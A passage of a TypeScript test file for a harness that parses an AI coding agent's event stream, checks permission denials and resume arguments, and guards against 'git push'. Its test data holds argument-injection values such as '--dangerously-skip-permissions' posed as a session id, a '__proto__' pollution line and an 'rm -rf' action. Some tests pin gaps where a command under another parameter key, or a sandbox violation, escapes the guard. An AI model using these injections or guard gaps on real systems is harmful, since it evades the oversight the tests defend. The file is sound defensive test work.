      const r = parse([INIT, RESULT({ denied_actions: denied })]);
      expect(r.result, JSON.stringify(denied)).toMatchObject({ ok: true });
    }
  });

  it("a non-string error is an unknown provider error; an empty error string is none", () => {
    for (const error of [{ code: 429 }, ["x"], 1, false]) {
      const r = parse([INIT, RESULT({ error })]);
      expect(r.result, JSON.stringify(error)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    }
    expect(parse([INIT, RESULT({ error: "" })]).result).toMatchObject({ ok: true });
    expect(parse([INIT, RESULT({ error: null })]).result).toMatchObject({ ok: true });
  });

  it("an unrecorded rate-limit or quota text in error is TOOL_FAILURE, never RATE_LIMIT_TRANSIENT or success", () => {
    for (const error of ["RESOURCE_EXHAUSTED: quota exceeded", "429 Too Many Requests", "rate limit reached"]) {
      const r = parse([INIT, RESULT({ status: "ERROR", response: "", error })]);
      expect(r.result, error).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
      expect(
        r.events.some((e) => e.kind === "rate_limit"),
        error,
      ).toBe(false);
    }
  });

  it("a tool call after the result line is not a success (fail closed); a guard verdict on it keeps its own code", () => {
    const trailing = parse([INIT, RESULT(), TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "ls" } })]);
    expect(trailing.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "tool call after the result line",
      nativeSessionId: CID,
    });
    // A tool step with no recorded parameters is still a tool call after the result.
    expect(parse([INIT, RESULT(), TOOL(3, "ACTIVE")]).result).toMatchObject({
      ok: false,
      failureDetail: "tool call after the result line",
    });
    // Non-tool steps after the result are dropped by the parser, so they are not trailing tool calls.
    const textAfter = parse([INIT, RESULT(), j({ event: "step_update", step_index: 4, step_type: "checkpoint" })]);
    expect(textAfter.result).toMatchObject({ ok: true });
    // The same call before the result is clean.
    expect(parse([INIT, TOOL(3, "ACTIVE", { name: "run_command" }), RESULT()]).result).toMatchObject({ ok: true });
    // A guard verdict on the trailing call keeps its own code (ADR-0039), not the trailing-tool protocol error.
    const ctx = { cwd: "/work/tree", home: "/home/synthetic", bypass: true };
    const flagged = parse([
      INIT,
      RESULT(),
      TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "git push origin main" } }),
    ]);
    expect(
      flagged.a.extractResult(
        flagged.events.map((e) => guardEvent(e, ctx)),
        EXIT0,
      ),
    ).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("a second result line fails the run even when it reports SUCCESS", () => {
    const failedThenOk = parse([INIT, RESULT({ status: "ERROR" }), RESULT()]);
    expect(failedThenOk.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    const okTwice = parse([INIT, RESULT(), RESULT()]);
    expect(okTwice.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    expect(okTwice.events.filter((e) => e.kind === "result").map((e) => e.kind === "result" && e.ok)).toEqual([
      true,
      false,
    ]);
  });

  it("a second result line records no second usage row, so the run total is never counted twice (FR-CAP-01)", () => {
    const { events } = parse([INIT, RESULT(), RESULT({ usage: { ...USAGE, total_tokens: 99 } })]);
    expect(events.filter((e) => e.kind === "usage")).toEqual([
      { kind: "usage", source: "provider_reported", metrics: USAGE },
    ]);
  });

  it("a step for another conversation fails the run, keeps the first id bound and still reaches the guard", () => {
    const other = "0b6c2d1e-0000-4000-8000-00000000000d";
    const step = (cid: string, o: Record<string, unknown>) =>
      j({ event: "step_update", conversation_id: cid, step_index: 2, state: "DONE", ...o });
    const text = parse([INIT, step(other, { step_type: "agent_response", text_delta: "x" }), RESULT()]);
    expect(text.state.nativeSessionId).toBe(CID);
    expect(text.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR", nativeSessionId: CID });
    const tool = parse([
      INIT,
      step(other, { step_type: "tool", tool_name: "run_command", tool_info: { parameters: { command: "ls" } } }),
      RESULT(),
    ]);
    expect(tool.events).toContainEqual({ kind: "tool_call", tool: "shell", name: "run_command", command: "ls" });
    expect(tool.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    // The same id, an empty or absent id, and a step before any binding are not anomalies; a step never binds.
    const same = parse([INIT, step(CID, { step_type: "agent_response" }), RESULT()]);
    expect(same.result).toMatchObject({ ok: true });
    const absent = parse([INIT, j({ event: "step_update", step_index: 2, step_type: "agent_response" }), RESULT()]);
    expect(absent.result).toMatchObject({ ok: true });
    const early = parse([step(other, { step_type: "agent_response" })]);
    expect(early.state.nativeSessionId).toBeUndefined();
    expect(early.events).toEqual([]);
  });

  it("supervisor outcomes win over a denial, a denial over an envelope error, and the guard over both", () => {
    const denied = RESULT({ denied_actions: [{ action: "run_command", display_name: "rm -rf x" }], error: "boom" });
    const { a, events } = parse([INIT, denied]);
    expect(a.extractResult(events, { ...EXIT0, outcome: "cancelled" })).toMatchObject({ failureCode: "CANCELLED" });
    expect(a.extractResult(events, { ...EXIT0, outcome: "timeout", timeoutKind: "wall_clock" })).toMatchObject({
      failureCode: "PROCESS_TIMEOUT",
    });
    expect(a.extractResult(events, { ...EXIT0, exitCode: 3 })).toMatchObject({ failureCode: "PERMISSION_BLOCKED" });
    expect(a.extractResult(events, EXIT0)).toMatchObject({ failureCode: "PERMISSION_BLOCKED" });
    const authThenProtocol = parse([INIT, RESULT({ status: "ERROR", error: "authentication failed: x" }), RESULT()]);
    expect(authThenProtocol.result).toMatchObject({ ok: false, failureCode: "AUTH_REQUIRED" });
    const guarded: NormalizedEvent[] = [
      {
        kind: "tool_call",
        tool: "shell",
        name: "run_command",
        command: "git push",
        violation: { kind: "git_write", reason: "git push" },
      },
      ...events,
    ];
    expect(a.extractResult(guarded, EXIT0)).toMatchObject({ failureCode: "PERMISSION_BLOCKED" });
    expect(a.extractResult(guarded, EXIT0).failureDetail).toMatch(/^git write attempted/);
  });

  it("an auth or model error on a clean SUCCESS envelope fails it; an unknown line after it does not rebind", () => {
    // The error field is independent of status. A SUCCESS envelope with tokens is otherwise a success (Q-86); the
    // recorded auth and model prefixes still fail it. An unknown line cannot supply a conversation id.
    expect(parse([INIT, RESULT({ error: "authentication failed or timed out" })]).result).toMatchObject({
      ok: false,
      failureCode: "AUTH_REQUIRED",
      failureDetail: "auth: authentication failed or timed out",
      nativeSessionId: CID,
    });
    expect(parse([INIT, RESULT({ error: "invalid model selection (--model x)" })]).result).toMatchObject({
      ok: false,
      failureCode: "MODEL_UNAVAILABLE",
      failureDetail: "model_unavailable: invalid model selection (--model x)",
    });
    const after = parse([
      INIT,
      RESULT(),
      j({ event: "synthetic_future_event", conversation_id: "must-not-bind", ok: true }),
    ]);
    expect(after.result).toMatchObject({ ok: true, nativeSessionId: CID, unknownEventCount: 1 });
    expect(after.state.nativeSessionId).toBe(CID);
    expect(JSON.stringify(after.events)).not.toContain("must-not-bind");
  });

  it("a denial on a second result beats that line's protocol error; a late auth error does not", () => {
    const authLate = parse([
      INIT,
      RESULT(),
      RESULT({ status: "ERROR", response: "", error: "authentication failed or timed out" }),
    ]);
    expect(authLate.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "protocol: more than one result line",
      nativeSessionId: CID,
    });
    expect(authLate.events.filter((e) => e.kind === "usage")).toHaveLength(1);
    const deniedLate = parse([
      INIT,
      RESULT(),
      RESULT({
        status: "ERROR",
        response: "",
        error: "authentication failed or timed out",
        denied_actions: [{ display_name: "RunCommand" }],
      }),
    ]);
    expect(deniedLate.result).toMatchObject({
      ok: false,
      failureCode: "PERMISSION_BLOCKED",
      failureDetail: "denied: RunCommand",
      nativeSessionId: CID,
    });
  });

  it("negative and non-number usage values are dropped; zero total is not a success", () => {
    const r = parse([
      INIT,
      RESULT({ usage: { input_tokens: -5, output_tokens: "3", thinking_tokens: null, total_tokens: 24, extra: 9 } }),
    ]);
    expect(r.events.find((e) => e.kind === "usage")).toEqual({
      kind: "usage",
      source: "provider_reported",
      metrics: { total_tokens: 24 },
    });
    expect(r.result).toMatchObject({ ok: true });
    const negative = parse([INIT, RESULT({ usage: { total_tokens: -1 } })]);
    expect(negative.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    const usageNotObject = parse([INIT, RESULT({ usage: [24] })]);
    expect(usageNotObject.result).toMatchObject({ ok: false });
  });

  it("a tool step is reported once; a later update that names a new command or path is reported for the guard", () => {
    const late = parse([
      INIT,
      TOOL(3, "ACTIVE"),
      TOOL(3, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      TOOL(3, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      RESULT(),
    ]);
    expect(late.events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "run_command" },
      { kind: "tool_call", tool: "shell", name: "run_command", command: "git push origin main" },
    ]);
    const early = parse([
      INIT,
      TOOL(4, "ACTIVE", { name: "write_to_file", parameters: { path: "/work/tree/a.txt" } }),
      TOOL(4, "DONE", { name: "write_to_file", parameters: { path: "/elsewhere" } }),
      TOOL(4, "DONE"),
      RESULT(),
    ]);
    // A later update that swaps the path (or command) is reported too, so it cannot hide an unchecked one; repeats
    // and updates without parameters add nothing.
    expect(early.events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "write_to_file", target: "/work/tree/a.txt" },
      { kind: "tool_call", tool: "other", name: "write_to_file", target: "/elsewhere" },
    ]);
    const swapped = parse([
      INIT,
      TOOL(5, "ACTIVE", { name: "run_command", parameters: { command: "ls" } }),
      TOOL(5, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      TOOL(5, "DONE", { name: "run_command", parameters: { command: "ls" } }),
      TOOL(5, "DONE", { name: "run_command", parameters: { command: "git push origin main" } }),
      RESULT(),
    ]);
    const commands = swapped.events.flatMap((e) => (e.kind === "tool_call" ? [e.command] : []));
    expect(commands).toEqual(["ls", "git push origin main"]);
    // Steps are keyed per run: a new parse state starts with no seen steps.
    expect(
      parse([INIT, TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "ls" } })]).events,
    ).toContainEqual({
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      command: "ls",
    });
  });

  it("a conversation id that is not one safe token binds nothing and fails the run; an empty id binds nothing", () => {
    for (const id of ["-c", "--dangerously-skip-permissions", "a b", "x\ny", "../x", "x".repeat(257)]) {
      const r = parse([j({ event: "init", conversation_id: id, init: {} }), RESULT({ conversation_id: id })]);
      expect(r.state.nativeSessionId, id).toBeUndefined();
      expect(
        r.events.some((e) => e.kind === "session_bound"),
        id,
      ).toBe(false);
      expect(r.result, id).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
      expect(r.result, id).not.toHaveProperty("nativeSessionId");
    }
    // Recorded shapes: an empty id (C6, C10) binds nothing and is no anomaly; a later UUID still binds.
    const late = parse([j({ event: "init", conversation_id: "", init: {} }), RESULT()]);
    expect(late.result).toMatchObject({ ok: true, nativeSessionId: CID });
  });

  it("status and event names are matched exactly; SUCCESS without total_tokens is not a success (Q-86)", () => {
    for (const status of ["success", "Success", " SUCCESS", "SUCCESS "]) {
      expect(parse([INIT, RESULT({ status })]).result, status).toMatchObject({
        ok: false,
        failureCode: "TOOL_FAILURE",
      });
    }
    const noTotal = parse([INIT, RESULT({ usage: { input_tokens: 20, output_tokens: 3 } })]);
    expect(noTotal.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    const r = parse([INIT, j({ event: "Result", result: { status: "SUCCESS", usage: USAGE } })]);
    expect(r.state.unknownEvents).toBe(1);
    expect(r.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
  });

  it("a tool step after the result line still reaches the guard", () => {
    const { events } = parse([
      INIT,
      RESULT(),
      TOOL(9, "ACTIVE", { name: "run_command", parameters: { command: "git push origin main" } }),
    ]);
    expect(events.at(-1)).toEqual({
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      command: "git push origin main",
    });
  });

  it("pins the Assumption gap: a command under an unrecorded parameter key or of another type is not seen", () => {
    // The live check recorded `tool_info.parameters` but not its keys (T4.33 "Not done" (3)). These reports carry no
    // command, so the tool-call guard cannot flag them and FR-GIT-03 and FR-GIT-06 remain; a capture replaces this test.
    const { events, result } = parse([
      INIT,
      TOOL(6, "ACTIVE", { name: "run_command", parameters: { cmd: "git push origin main" } }),
      TOOL(7, "ACTIVE", { name: "run_command", parameters: { command: ["git", "push"] } }),
      TOOL(8, "ACTIVE", { name: "run_command", parameters: "git push origin main" }),
      RESULT(),
    ]);
    expect(events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "run_command" },
      { kind: "tool_call", tool: "other", name: "run_command" },
      { kind: "tool_call", tool: "other", name: "run_command" },
    ]);
    expect(result).toMatchObject({ ok: true });
  });

  it("pins the gap: init.permission_mode is not read, so it never changes the outcome", () => {
    // Recorded: `request-review` ([LIVE] C7b, C18); [H] documents `always-proceed` under the bypass flag. Whether a
    // mismatch with the compiled flag should fail the run is not decided; the outcome rests on the result envelope.
    for (const mode of ["always-proceed", "request-review", "brand-new", undefined]) {
      const init = j({
        event: "init",
        conversation_id: CID,
        init: mode === undefined ? {} : { permission_mode: mode },
      });
      expect(parse([init, RESULT()]).result, String(mode)).toMatchObject({ ok: true, nativeSessionId: CID });
    }
  });

  it("malformed step and init lines are unknown and counted; non-object roots and arrays never bind or succeed", () => {
    const { state, events, result } = parse([
      j({ event: "step_update", step_type: "tool", step_index: "1" }),
      j({ event: "step_update", step_index: 1 }),
      j({ event: "init", conversation_id: 7, init: {} }),
      j({ event: "init", conversation_id: CID, init: [] }),
      j({ event: 1 }),
      j({ event: "result", result: { status: 200 } }),
      j({ event: "result", result: "SUCCESS" }),
      "[]",
      "null",
      '"result"',
      "42",
    ]);
    expect(state.unknownEvents).toBe(11);
    expect(events.every((e) => e.kind === "unknown")).toBe(true);
    expect(state.nativeSessionId).toBeUndefined();
    expect(result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR", unknownEventCount: 11 });
  });

  it("a __proto__ key in a line changes nothing outside the parsed document", () => {
    const { result } = parse([INIT, '{"event":"result","__proto__":{"polluted":1},"result":{"status":"ERROR"}}']);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(result).toMatchObject({ ok: false });
  });

  it("ACP messages are ignored (no ACP transport)", () => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    expect(a.parseEvent({ jsonrpc: "2.0", method: "session/update" } as never, state)).toEqual([]);
    expect(state.lines).toBe(0);
  });

  it("resume compiles only where compile does: the approved bypass cell, as the compile argv plus --conversation <id>", () => {
    // T4.35 (owner decision 67, Q-86; [LIVE] C9 run 2: `--conversation <id>` keeps the conversation_id).
    let count = 0;
    for (const scope of scopeShapes()) {
      const profile = privilegedProfile(scope);
      for (const approved of [false, true]) {
        const label = JSON.stringify({ scope, approved });
        const req = request({ bypassApproved: approved });
        const p = { ...profile, bypassApproved: approved };
        const first = adapter().compile(req, p);
        const r = adapter().resumeArgs({ provider: "antigravity", nativeSessionId: CID }, req, p);
        if (isIneligible(first)) {
          expect(r, label).toEqual(first);
          continue;
        }
        count += 1;
        if (isIneligible(r)) throw new Error(`${label}: ${r.detail}`);
        // Argv audit: exactly the first-run argv plus the two words; no bypass flag beyond the cell's own.
        expect(r.argv, label).toEqual([...first.argv, "--conversation", CID]);
        expect(r.policyFlags, label).toEqual(first.policyFlags);
        expect(auditInvocation(r), label).toEqual(auditInvocation(first));
        expect(auditInvocation(r, { profile, bypassApproved: true }), label).toEqual([]);
        expect(
          r.argv.filter((a) => bypassClassFlags().includes(a)),
          label,
        ).toEqual(["--dangerously-skip-permissions"]);
        expect(r.resumeNativeSessionId, label).toBe(CID);
        expect(first.resumeNativeSessionId, label).toBeUndefined();
      }
    }
    expect(count).toBe(1);
    for (const name of PROFILES) {
      for (const bypassApproved of [false, true]) {
        const r = adapter().resumeArgs({ provider: "antigravity", nativeSessionId: CID }, request({ bypassApproved }), {
          ...profileOf(name),
          bypassApproved,
        });
        expect(r, name).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
      }
    }
    expect(compiled().argv.some((a) => a.startsWith("--conversation") || a.startsWith("-conversation"))).toBe(false);
  });

  it("resume never compiles a foreign binding or an id that is not one safe token, and never uses -c", () => {
    const profile = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    expect(
      adapter().resumeArgs({ provider: "codex", nativeSessionId: CID }, request({ bypassApproved: true }), profile),
    ).toMatchObject({ reason: "CAPABILITY_MISSING", detail: "binding is for codex" });
    for (const nativeSessionId of ["", "--dangerously-skip-permissions", "-c", "../x", "a b", "a".repeat(257)]) {
      expect(
        adapter().resumeArgs({ provider: "antigravity", nativeSessionId }, request({ bypassApproved: true }), profile),
        nativeSessionId,
      ).toMatchObject({
        ineligible: true,
        reason: "CAPABILITY_MISSING",
        detail: "native session id is not a safe single argument",
      });
    }
    const r = adapter().resumeArgs(
      { provider: "antigravity", nativeSessionId: CID },
      request({ bypassApproved: true }),
      profile,
    );
    if (isIneligible(r)) throw new Error(r.detail);
    expect(r.argv.some((a) => a === "-c" || a === "--continue")).toBe(false);
  });

  it("a resumed run fails closed when the returned conversation_id differs or is missing (owner decision 67, C9 run 5)", () => {
    const a = adapter();
    const parse = (lines: string[], resumeNativeSessionId?: string) => {
      const state: ParseState = {
        lines: 0,
        unknownEvents: 0,
        ...(resumeNativeSessionId ? { resumeNativeSessionId } : {}),
      };
      const events = lines.flatMap((l) => a.parseEvent(l, state));
      const exit: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
      return { state, events, result: a.extractResult(events, exit) };
    };
    const usage = { input_tokens: 2, output_tokens: 1, total_tokens: 3 };
    const init = (id: string) => JSON.stringify({ event: "init", conversation_id: id, init: { cwd: "/work/tree" } });
    const result = (id?: string) =>
      JSON.stringify({
        event: "result",
        result: { ...(id === undefined ? {} : { conversation_id: id }), status: "SUCCESS", response: "ok", usage },
      });
    const OTHER = "0b6c2d1e-0000-4000-8000-000000000099";
    // Same id: resumed (C9 runs 2 and 3).
    expect(parse([init(CID), result(CID)], CID).result).toMatchObject({ ok: true, nativeSessionId: CID });
    // A different id: a new conversation (C9 run 5). The new id is never bound, so it cannot replace the binding.
    const changed = parse([init(OTHER), result(OTHER)], CID);
    expect(changed.events.filter((e) => e.kind === "session_bound")).toEqual([]);
    expect(changed.events.filter((e) => e.kind === "provider_error")).toEqual([
      {
        kind: "provider_error",
        category: "protocol",
        message: "resumed conversation id differs from the requested one",
      },
    ]);
    expect(changed.result).toEqual({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "protocol: resumed conversation id differs from the requested one",
      unknownEventCount: 0,
      summary: "ok",
    });
    // A result-only stream for another conversation fails the same way.
    expect(parse([result(OTHER)], CID).result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "protocol: resumed conversation id differs from the requested one",
    });
    // No id at all (empty or absent): nothing shows the conversation was resumed.
    for (const lines of [[result()], [init(""), result("")], [init(""), result()]]) {
      const r = parse(lines, CID);
      expect(r.state.nativeSessionId).toBeUndefined();
      expect(r.result).toMatchObject({
        ok: false,
        failureCode: "OUTPUT_PROTOCOL_ERROR",
        failureDetail: "protocol: resume returned no conversation id",
      });
    }
    // Without a requested id (a first run) the same streams keep their earlier verdicts.
    expect(parse([init(OTHER), result(OTHER)]).result).toMatchObject({ ok: true, nativeSessionId: OTHER });
    expect(parse([result()]).result).toMatchObject({ ok: true });
  });
});

/**
 * T4.33 Done-when cases whose native shape the 2026-10-14 live check did NOT record (ROADMAP T4.33 "Not done" (2):
 * exit 3 with `AGY_ERROR` on stderr, rate limit, sandbox violation; and usage shapes other than the C4 envelope).
 * SYNTHETIC: each pins today's fail-closed (or, for a sandbox violation, undetected) outcome; a capture (T4.31
 * extension) must change them. Mirrors Grok Build's "cases with no recorded native shape" (T4.23).
 */
describe("antigravity cases with no recorded native shape (T4.33, synthetic shapes)", () => {
  const CID = "0b6c2d1e-0000-4000-8000-00000000000e";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const INIT = j({
    event: "init",
    conversation_id: CID,
    init: { cwd: "/work/tree", permission_mode: "always-proceed" },
  });
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const RESULT = (over: Record<string, unknown> = {}, outer: Record<string, unknown> = {}) =>
    j({
      event: "result",
      ...outer,
      result: { conversation_id: CID, status: "SUCCESS", response: "ok", num_turns: 1, usage: USAGE, ...over },
    });
  const STEP = (o: Record<string, unknown>) => j({ event: "step_update", conversation_id: CID, ...o });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const EXIT3: ExitInfo = { ...EXIT0, exitCode: 3 };
  const parse = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const events: NormalizedEvent[] = lines.flatMap((l) => a.parseEvent(l, state));
    return { a, state, events };
  };
  const neverRateLimit = (events: readonly NormalizedEvent[]) =>
    expect(events.some((e) => e.kind === "rate_limit" || e.kind === "sandbox_violation")).toBe(false);

  it("exit 3 (AGY_ERROR on stderr, not passed to the adapter) with no result is TOOL_FAILURE, never a rate limit", () => {
    const { a, events } = parse([
      INIT,
      STEP({ step_index: 1, state: "ACTIVE", step_type: "agent_response", text_delta: "x" }),
    ]);
    expect(a.extractResult(events, EXIT3)).toEqual({
      ok: false,
      failureCode: "TOOL_FAILURE",
      failureDetail: "exit code 3",
      nativeSessionId: CID,
      unknownEventCount: 0,
    });
    // A C10-shaped ERROR envelope at exit 3 carrying invented retry text is still TOOL_FAILURE.
    const envelope = parse([INIT, RESULT({ status: "ERROR", response: "", error: "UNAVAILABLE: retry after 30s" })]);
    expect(envelope.a.extractResult(envelope.events, EXIT3)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    neverRateLimit([...events, ...envelope.events]);
  });

  it("an AGY_ERROR-shaped object or an invented error event on stdout is an unknown line, never a rate limit", () => {
    const agyError = j({ status: "RESOURCE_EXHAUSTED", code: 429, retryable: true, error_id: "synthetic" });
    const { a, state, events } = parse([INIT, agyError, j({ event: "error", error: { code: 429 } }), RESULT()]);
    expect(events.filter((e) => e.kind === "unknown")).toEqual([
      { kind: "unknown", rawType: "none" },
      { kind: "unknown", rawType: "error" },
    ]);
    expect(state.unknownEvents).toBe(2);
    neverRateLimit(events);
    // Unknown lines do not change a clean envelope (as `unknown_event.jsonl`); at exit 3 the run fails.
    expect(a.extractResult(events, EXIT0)).toMatchObject({ ok: true, unknownEventCount: 2 });
    expect(a.extractResult(events, EXIT3)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
  });

  it("pins the gap: a tool step's tool_info.error or output is not read, so a sandbox violation is NOT detected", () => {
    // TDD §4.4.1 names `tool_info.error` {type, message} on a failed tool; its values were not recorded and FR-ADP-04
    // forbids reading status from text, so the parser emits no `sandbox_violation`. In the one compiled cell (approved
    // bypass) `--sandbox` is not compiled anyway (Q-84). A capture that shows a structured marker replaces this test.
    const { a, events } = parse([
      INIT,
      STEP({
        step_index: 2,
        state: "DONE",
        step_type: "tool",
        tool_name: "run_command",
        tool_info: {
          name: "run_command",
          output: "Operation not permitted",
          error: { type: "SANDBOX_DENIED", message: "sandbox blocked a write outside the workspace" },
        },
      }),
      RESULT(),
    ]);
    expect(events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "other", name: "run_command" },
    ]);
    neverRateLimit(events);
    expect(a.extractResult(events, EXIT0)).toMatchObject({ ok: true, nativeSessionId: CID, unknownEventCount: 0 });
  });

  it("usage comes only from the result envelope's recorded snake_case keys; other shapes record nothing and fail", () => {
    // Per-step usage alone (the envelope has none): no usage row, and no total_tokens, so not a success (Q-86).
    const stepOnly = parse([
      INIT,
      STEP({ step_index: 1, state: "DONE", step_type: "agent_response", usage: USAGE }),
      RESULT({ usage: undefined }),
    ]);
    expect(stepOnly.events.some((e) => e.kind === "usage")).toBe(false);
    expect(stepOnly.a.extractResult(stepOnly.events, EXIT0)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    // Usage beside `result` rather than inside it, camelCase keys and a nested total are not read.
    for (const [over, outer] of [
      [{ usage: undefined }, { usage: USAGE }],
      [{ usage: { inputTokens: 20, outputTokens: 3, totalTokens: 24 } }, {}],
      [{ usage: { total: { total_tokens: 24 } } }, {}],
      [{ usage: { total_tokens: "24" } }, {}],
    ] as const) {
      const r = parse([INIT, RESULT(over, outer)]);
      const label = JSON.stringify([over, outer]);
      expect(
        r.events.some((e) => e.kind === "usage"),
        label,
      ).toBe(false);
      expect(r.a.extractResult(r.events, EXIT0), label).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    }
    // A number that overflows to Infinity in JSON is dropped like any non-finite value.
    const overflow = parse([INIT, RESULT().replace('"total_tokens":24', '"total_tokens":1e999')]);
    expect(overflow.events.find((e) => e.kind === "usage")).toEqual({
      kind: "usage",
      source: "provider_reported",
      metrics: { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0 },
    });
    expect(overflow.a.extractResult(overflow.events, EXIT0)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
  });

  it("num_turns, duration_seconds and the slash-command quota data are never usage metrics", () => {
    // C9: on a resumed conversation `num_turns` counted earlier turns and `duration_seconds` looked cumulative; C6:
    // `/usage` and `/credits` put quota under `command.data`. Neither is a documented per-run counter, so only the five
    // USAGE_KEYS are recorded (FR-CAP-01) and a resume marker is not inferred from them (Q-86).
    const { events } = parse([
      INIT,
      RESULT({
        num_turns: 3,
        duration_seconds: 100,
        command: { name: "credits", data: { remaining_credits: 50, upgrade_uri: "https://example.invalid" } },
        usage: { ...USAGE, num_turns: 3, remaining_credits: 50 },
      }),
    ]);
    expect(events.filter((e) => e.kind === "usage")).toEqual([
      { kind: "usage", source: "provider_reported", metrics: USAGE },
    ]);
  });

  // The same outcomes replayed end to end from fixture files through the supervisor (as Grok Build's T4.23 fixtures).
  const replayCase = (
    fixture: string,
    kind: ConformanceCase["kind"],
    exp: ConformanceCase["expect"],
  ): ConformanceCase => ({
    kind,
    adapter: replayAdapter(fixture),
    request: {
      runId: "run_antigravity_t433_fixture",
      objective: "synthetic antigravity objective",
      constraints: [],
      workspace: { cwd: makeCwd(), writable: true },
      bypassApproved: true,
    },
    profile: PRIVILEGED_BYPASS_PROFILE,
    expect: exp,
  });
  const fixtureEvents = (fixture: string) =>
    parse(
      readFileSync(fixturePath(fixture), "utf8")
        .split("\n")
        .filter((l) => l !== "" && !l.includes('"_fixture"')),
    ).events;

  it("fixture agy_error_exit3 replays a stream with no result at exit 3 to TOOL_FAILURE, never RATE_LIMIT_TRANSIENT", async () => {
    const report = await runConformanceCase(
      replayCase("agy_error_exit3", "task_failure", { ok: false, failureCode: "TOOL_FAILURE" }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      failureDetail: "exit code 3",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("fixture sandbox_violation_unrecorded replays to a success: the tool's error is not read (gap, pinned)", async () => {
    const report = await runConformanceCase(
      replayCase("sandbox_violation_unrecorded", "task_failure", { ok: true, nativeSessionId: DEFAULT_SESSION_ID }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, unknownEventCount: 0 });
    neverRateLimit(fixtureEvents("sandbox_violation_unrecorded"));
  });

  it("fixture usage_unrecorded replays to TOOL_FAILURE and records no usage row", async () => {
    const report = await runConformanceCase(
      replayCase("usage_unrecorded", "task_failure", { ok: false, failureCode: "TOOL_FAILURE" }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, nativeSessionId: DEFAULT_SESSION_ID });
    expect(fixtureEvents("usage_unrecorded").some((e) => e.kind === "usage")).toBe(false);
  });

  it("fixture rate_limit replays an empty stream at exit 1 to TOOL_FAILURE, never RATE_LIMIT_TRANSIENT", async () => {
    const report = await runConformanceCase(
      replayCase("rate_limit", "task_failure", { ok: false, failureCode: "TOOL_FAILURE" }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", unknownEventCount: 0 });
    expect(report.result).not.toHaveProperty("nativeSessionId");
  });

  it("fixture rate_limit_error replays an in-stream ERROR envelope at exit 0 to TOOL_FAILURE, never RATE_LIMIT_TRANSIENT or success", async () => {
    const report = await runConformanceCase(
      replayCase("rate_limit_error", "task_failure", {
        ok: false,
        failureCode: "TOOL_FAILURE",
        nativeSessionId: DEFAULT_SESSION_ID,
      }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", unknownEventCount: 0 });
  });

  it("fixture unknown_events replays to OUTPUT_PROTOCOL_ERROR: every unreadable line is counted and none binds a session", async () => {
    const report = await runConformanceCase(
      replayCase("unknown_events", "malformed_output", { ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR", unknownEventCount: 5 });
    expect(report.result).not.toHaveProperty("nativeSessionId");
  });

